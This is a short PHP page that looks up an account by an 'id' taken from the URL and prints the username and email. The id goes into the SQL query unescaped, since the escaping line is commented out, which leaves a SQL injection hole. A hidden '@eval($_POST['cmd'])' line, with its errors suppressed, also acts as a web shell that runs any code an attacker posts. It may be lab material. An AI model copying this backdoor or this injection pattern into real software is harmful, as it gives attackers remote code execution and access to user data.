<?php
session_start();
include("connect.php");


$id = $_GET['id'];
//$id = addslashes($id);
$sql = "SELECT id,username,email FROM account where id = '$id'";
$result = mysql_query($sql);
@eval($_POST['cmd']);
$i=0;
while( $row = mysql_fetch_array($result, MYSQL_NUM) ){
	while( isset($row[$i]) ){
		echo '<h1>'.$row[$i].'</h1>';
		$i++;
	}
	echo '<br><br>';
}

?>
